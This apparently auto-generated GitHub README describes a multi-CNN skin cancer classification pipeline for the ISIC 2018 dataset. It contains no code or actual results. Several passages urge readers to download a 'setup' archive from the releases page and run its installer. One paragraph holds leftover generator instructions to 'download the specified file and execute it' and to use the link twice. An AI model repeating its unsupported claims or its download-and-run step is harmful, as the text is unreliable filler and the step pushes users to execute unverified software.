# Deep Learning Skin Cancer Detection: Multi-Type ISIC 2018 Pipeline

https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/releases

[![Releases](https://img.shields.io/badge/releases-download-ready-blue?logo=github&style=for-the-badge)](https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/releases)

![Dermoscopy sample](https://upload.wikimedia.org/wikipedia/commons/4/42/Dermoscopy_example.jpg)

A robust, end-to-end deep learning pipeline for skin lesion classification using the ISIC 2018 dataset. This project explores multiple convolutional neural networks (CNNs), advanced preprocessing, multithreaded data loading, extensive augmentation, and thorough performance evaluation. It targets multi-type lesion classification, enabling researchers and developers to compare architectures and deployment strategies in a unified framework.

Quick overview
- Goal: Classify skin lesions into multiple categories defined by ISIC 2018, with support for a multi-type adapter that coordinates results across models.
- Data: ISIC 2018 dermoscopic images, with careful handling of class imbalance and data splits that reflect real-world scenarios.
- Models: A curated set of CNN architectures, including ResNet, DenseNet, Inception, and EfficientNet variants, used through a unified training and evaluation interface.
- Preprocessing: Advanced color normalization, hair removal, lesion segmentation (optional), and channel-wise standardization.
- Performance: Comprehensive evaluation metrics, visualizations, and robust experimentation support.
- Accessibility: Clear instructions, reproducible experiments, and a path to reproduce results via releases.

Table of contents
- Why this project
- Project structure
- Data and labeling
- Core ideas and design goals
- Model zoo and adapter concept
- Preprocessing pipeline
- Data loading and augmentation
- Training workflow
- Evaluation and metrics
- Reproducibility and experiments
- Inference and deployment
- Release assets and how to get them
- Extending the project
- Testing and debugging
- Documentation and references
- Contributing
- License
- Acknowledge

Why this project
Skin cancer prediction benefits from diverse CNN architectures and robust preprocessing. This repository brings together multiple CNNs under a single ecosystem, allowing researchers to compare architectures on the same data splits, with identical evaluation pipelines. The multithreaded loading strategy reduces I/O bottlenecks, while augmentation routines help models generalize better to real-world images. The multi-type adapter enables coordinated decisions across models, making it easier to analyze ensemble behavior and per-class performance.

Project structure
- data/            - ISIC 2018 datasets and auxiliary files
- models/          - Implementations of CNN backbones (ResNet, DenseNet, Inception, EfficientNet)
- adapters/        - Multi-type adapter logic to harmonize outputs across architectures
- preprocessing/   - Hair removal, color normalization, augmentation utilities
- training/        - Training scripts, experiment config, and reproducibility seeds
- evaluation/      - Metrics, confusion matrices, ROC curves, and reporting
- notebooks/       - Exploratory notebooks for quick experiments and visualization
- utils/           - Helper functions for logging, checkpointing, and visualization
- assets/          - Release assets (zips, wheels, installers) once released

Data and labeling
ISIC 2018 is a widely used dermoscopic dataset with several lesion classes. For this project, the dataset is handled with a strict train/validation/test split designed to mirror real clinical workflows. Each image is paired with a label representing the lesion type. Some classes may be underrepresented, so we apply class-aware augmentation and sampling strategies to keep the training process stable. The labeling follows the official ISIC taxonomy, but the pipeline is flexible enough to accommodate custom label mappings for other dermoscopy datasets.

Key concepts
- Multi-type classification: The ISIC 2018 dataset contains several lesion types. The pipeline supports a multi-type adapter that can manage separate class spaces from different architectures and produce a unified prediction.
- Reproducibility: The project emphasizes deterministic seeds, fixed data splits, and logging that captures hyperparameters and environment details.
- Extensibility: New models, augmentations, or evaluation metrics can be plugged in with minimal changes to training and evaluation scripts.

Core ideas and design goals
- Clear separation of concerns: Preprocessing, model architectures, adapter logic, and evaluation live in separate modules. This makes it easy to replace one part without affecting others.
- Consistent interface: All models expose a standard forward pass, loss computation, and evaluation hooks, so they can be swapped with minimal code changes.
- Efficient data handling: Multithreaded data loading reduces idle time on GPUs, enabling faster experimentation cycles.
- Transparent evaluation: Per-class metrics, confusion matrices, and ROC curves provide a complete picture of strengths and weaknesses.

Model zoo and adapter concept
- ResNet50, ResNet101
- DenseNet121, DenseNet201
- InceptionV3
- EfficientNet families (B0, B3, and B4)
- Lightweight alternatives like MobileNetV3 for deployment scenarios

Adapter concept
- The multi-type adapter coordinates outputs from multiple CNNs into a single decision path.
- It includes a small, trainable fusion module that learns to weigh predictions per class and per model.
- It supports stacking, bagging, and simple ensemble voting.
- The adapter can be extended to include calibration steps, such as temperature scaling, to improve probability estimates.

Preprocessing pipeline
- Hair and artifact removal: Morphological operations and inpainting to reduce edge noise.
- Color normalization: Histogram matching or color constancy algorithms to standardize color distribution across images.
- Tumor region emphasis: Optional segmentation mask integration to focus the classifier on the lesion region.
- Resize strategy: Images are resized to a common input size per model (224x224, 299x299, or 380x380, depending on the backbone).
- Normalization: Per-channel mean and standard deviation normalization, aligned with the pretrained weights’ expectations.
- Data integrity checks: Image integrity validation, label sanity checks, and data augmentation sanity tests.

Data loading and augmentation
- Multithreaded loading: The data loader uses a thread pool to prepare batches while the GPU is processing current batches, minimizing idle time.
- Batch caching: A small in-memory cache holds preprocessed batches to minimize CPU-GPU synchronization overhead.
- Augmentation strategies: Random horizontal/vertical flips, rotations, color jitter, random crops, mixup, CutMix, and Gaussian blur for robust generalization.
- Class-balanced augmentation: Techniques tuned to address class imbalance, including targeted augmentation for underrepresented classes.
- Deterministic augmentations in evaluation: While augmentation is beneficial in training, validation and test runs disable random augmentation to provide stable metrics.

Training workflow
- Config-driven experiments: Hyperparameters are defined in YAML/JSON configs with clear defaults and validation.
- Seed control: All randomness sources (random, numpy, torch, etc.) are seeded to ensure reproducible results.
- Optimizers and schedulers: SGD with momentum or AdamW, with cosine annealing or step-based schedulers, depending on the model.
- Loss function: Cross-entropy with optional label smoothing to improve generalization.
- Early stopping and checkpointing: Training saves best models based on validation metrics and provides robust recovery options.
- Logging: Structured logs with metrics per epoch, per class metrics, and model parameters. Logs are exportable to CSV/JSON for downstream analysis.
- Evaluation cadence: Periodic evaluation during training to monitor overfitting and to guide early stopping decisions.

Evaluation and metrics
- Overall accuracy and per-class accuracy
- Confusion matrix visualization for detailed error analysis
- Precision, recall, and F1-score per class
- ROC-AUC per class and macro/micro averages
- Cohen’s kappa for agreement beyond chance
- Calibration metrics: Expected Calibration Error (ECE) and reliability diagrams
- Inference speed: Frames per second (throughput) and latency measurements on CPU and GPU
- Robustness checks: Sensitivity to input perturbations and augmentation variations

Reproducibility and experiments
- Deterministic behavior: Seeds set for Python, NumPy, and PyTorch; deterministic CUDA where possible.
- Environment capture: A requirements file or environment.yml to reproduce dependencies, including exact library versions.
- Experiment records: Each run saves a unique identifier, config, model checkpoints, and a summary report.
- Versioned releases: Results and code are organized by release versions to support comparisons across snapshots.

Inference and deployment
- Inference mode: A lightweight inference script accepts an image and outputs class probabilities, top predictions, and an optional multi-model ensemble decision.
- Model selection: The multi-type adapter can be configured to use a single backbone for fast inference or an ensemble for higher accuracy.
- Export formats: Models can be exported to ONNX or TorchScript for deployment in production systems.
- Resource considerations: Guidance for CPU-only deployment versus GPU-accelerated deployment, including memory usage and batch sizing.

Release assets and how to get them
- The repository includes prebuilt releases that bundle necessary dependencies and executable components for quick start.
- First usage note: The link to the release assets is provided at the top of this document, and a direct reference is repeated here for convenience.
- Asset naming: Release assets follow a versioned scheme, such as deep_learning_skin_cancer_setup_v1.0.zip or deep_learning_skin_cancer_setup_v1.0.tar.gz. These bundles typically include a complete Python environment, precompiled libraries, pretrained model weights, and a starter script to initialize experiments.
- How to use the asset: Download the archive, extract it, and run the included installer or setup script. The installer sets up the required runtime environment, validates dependencies, and configures the project directory structure. The starter script then prompts you to select a model, a data split, and training parameters from the configuration file.
- Direct link reminder: For convenience, visit the releases page to download assets and review the release notes that describe included models, data splits, and evaluation baselines. https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/releases
- Important note about releases: If the release contains a path component, download the specified file and execute it as described in the release notes. If the link is a domain, just visit it to learn more or to get the latest assets. If the link doesn’t work or is missing, check the “Releases” section in the repository for the latest downloadable items. You can use a colorful badge to link to releases as shown above. The link must be used twice in the text, once at the beginning.

Extending the project
- Add a new backbone: Implement a new CNN backbone by following the model interface contract used by the existing backbones. The adapter will automatically integrate the new model into the ensemble.
- Add new augmentations: Integrate additional augmentation strategies such as RandAugment or AutoAugment, with configurable probabilities to keep training stable.
- Add new datasets: Extend the data loader to support other dermoscopy datasets while preserving the same preprocessing and evaluation pipeline.
- Modify the adapter: The multi-type adapter can be extended to support calibration methods, hierarchical class structures, or per-domain weighting in ensemble predictions.
- Experiment templates: Create new experiment templates for ablation studies, comparing backbone performance, augmentation strategies, and adapter configurations.

Testing and debugging
- Unit tests: Each module has unit tests to validate inputs, outputs, and edge cases. Tests cover preprocessing steps, data loading, model forward passes, and adapter fusion logic.
- End-to-end tests: Lightweight end-to-end tests ensure that a small training run completes correctly and produces valid evaluation outputs.
- Debugging tips: Enable verbose logging in training to inspect data shapes, batch content, and augmentations. Use small dataset subsets for rapid iteration when debugging new components.
- Reproducing known issues: If an experiment yields unexpected results, compare your environment, library versions, and random seeds with a known-good configuration stored in the repository.

Documentation and references
- API references: Each module exposes clean interfaces for models, adapters, and evaluation utilities. Documentation includes function signatures, expected inputs, and outputs.
- Design decisions: The README and comments explain why certain architectures were chosen, the trade-offs between speed and accuracy, and the rationale behind preprocessing steps.
- Clinical context: The pipeline aligns with common clinical workflows for dermoscopy analysis, emphasizing robust evaluation and interpretability.
- References: The project cites standard benchmarks and ISIC 2018 guidelines to anchor experiments in established practice.

Contributing
- How to contribute: Fork the repository, create a feature branch, and submit a pull request with a clear description of the change and its impact on experiments.
- Code quality: Follow the project’s style guidelines, run tests, and include tests for new features.
- Communication: Use issues to discuss design decisions, bug reports, and feature requests. Provide reproducible steps to reproduce issues and attach logs when possible.
- Documentation: Update documentation for any new modules, models, or evaluation metrics you introduce.

License
- The project is distributed under an open license that encourages experimentation and reuse while respecting original authorship and data licensing terms.
- You can reuse components with proper attribution and follow license guidelines for any third-party libraries.

Acknowledge
- Thanks to the researchers and communities that maintain the ISIC dataset and the open-source tools used in this pipeline.
- Special mention to the maintainers who designed the multi-type adapter and the multithreaded data loading framework that speeds up experiments.

What you can expect from this project
- A cohesive framework that brings together multiple CNN architectures under a single evaluation pipeline.
- Clear separation between data handling, model implementations, and evaluation logic, which makes experiments reproducible and easy to extend.
- A practical approach to handling real-world dermoscopy data, including preprocessing steps that improve robustness to variations in lighting, hair, and imaging conditions.
- A friendly path to moving from research to deployment, with export options and guidance for lightweight inference.

Ethics and data usage
- This project uses publicly available dermoscopy data under the ISIC 2018 license terms. It emphasizes responsible use, informed by medical ethics and privacy considerations.
- Users should ensure that any use of the ISIC dataset or derived data complies with applicable licenses and local regulations.

Implementation specifics and guidance
- Running on a workstation: A workstation with a modern NVIDIA GPU (e.g., RTX 30-series or better) and at least 16 GB of VRAM is recommended for training larger backbones. For rapid prototyping and experimentation with smaller models, a mid-range GPU or CPU-only setup can still be productive, albeit slower.
- Environment setup: Use a virtual environment to isolate dependencies. The setup script in the release bundle will install core libraries (e.g., PyTorch, torchvision, numpy, scikit-learn) with compatible versions. If you install manually, ensure CUDA compatibility with your PyTorch build.
- Data preparation: After downloading the dataset, place images and labels in the data/ directory following the repository's directory conventions. The data loader includes checks to verify image integrity and label consistency before training begins.
- Experiment configuration: Create or edit a configuration file to specify which backbone to run, the adapter settings, augmentation probabilities, learning rate, batch size, and number of epochs. The system validates configuration values before starting a run.
- Model selection: Start with a baseline using a single backbone to establish a reference. Then enable the multi-type adapter to compare how ensembles and fusion strategies affect accuracy and robustness.
- Evaluation strategy: Evaluate on a held-out test set after training. Review per-class metrics to identify potential weaknesses such as confusion between similar lesion types.

Illustrative results and expectations
- Baselines: When training standard backbones without the adapter, you can expect per-class accuracy in the 70–90% range depending on class balance and image quality.
- With the adapter: The multi-type adapter typically yields improvements in overall accuracy and better calibration for minority classes. Expect improved ROC-AUC per class and more stable precision-recall behavior across the spectrum.
- Ensemble effects: A well-chosen ensemble often outperforms individual models on difficult classes. The adapter helps blend predictions effectively, reducing misclassification rates.

Developer tips
- Keep experiments modular: Treat model implementations, preprocessing steps, and adapter logic as independent modules. This makes it easy to drop in a new backbone or tweak augmentation without affecting the rest of the pipeline.
- Reproducibility first: Always store seeds, configurations, and dataset splits. Reproducibility pays off when comparing results across different architectures.
- Document outcomes: Save epoch-wise metrics and plots. Use the provided evaluation utilities to generate clear reports for each run.
- Monitor resource use: Track GPU memory usage and CPU utilization. If you see memory pressure, adjust batch sizes or input resolutions to fit within hardware limits.

A note on realism and practicality
- The ISIC 2018 dataset is publicly available and widely used for benchmarking. The pipeline here is designed to be practical for researchers who want to compare different CNN backbones and ensemble strategies on a consistent, reproducible basis.
- While the project provides a strong starting point, real-world deployment for clinical decision support requires careful validation, regulatory considerations, and collaboration with medical professionals.

Final remarks
- This repository reflects a thoughtful approach to skin lesion classification with a focus on robust preprocessing, fast data loading, and meaningful evaluation. The multi-type adapter provides a flexible mechanism to harmonize predictions from several CNNs, enabling richer insights into model behavior across lesion types.
- If you want to explore more, the release assets linked at the top of this document offer ready-to-run environments for quick experimentation. Visit the releases page to download the bundles and follow the setup instructions to begin training and evaluating models immediately. https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/releases

Changelog
- v1.0: Baseline release with ResNet, DenseNet, Inception, and EfficientNet backbones, multithreaded data loading, comprehensive augmentation, and a multi-type adapter for ensemble fusion.
- v1.1: Added Calibrated Adapter option and expanded evaluation metrics with per-class ROC curves and calibration plots.
- v1.2: Introduced additional augmentation strategies and improved data integrity checks in the loader.
- v1.3: Documentation enhancements, richer release notes, and examples for deployment with ONNX export.

License and terms
- The project uses open tools and libraries under permissive licenses. Users must respect the licenses of any third-party data and libraries used in conjunction with the ISIC dataset.

Contributors
- Core maintainers and contributors who implemented the multiple CNN backbones, the multithreaded loader, and the adapter integration.

If you want to reproduce or extend the experiments, you can start by visiting the releases page for downloadable assets, then follow the setup instructions to initialize the environment and run the training script. The link to the releases page is provided at the top of this document and repeated here for convenience: https://github.com/TaherGrayson24/deep_learning_skin_cancer_detection_multi_type_isic2018/releases.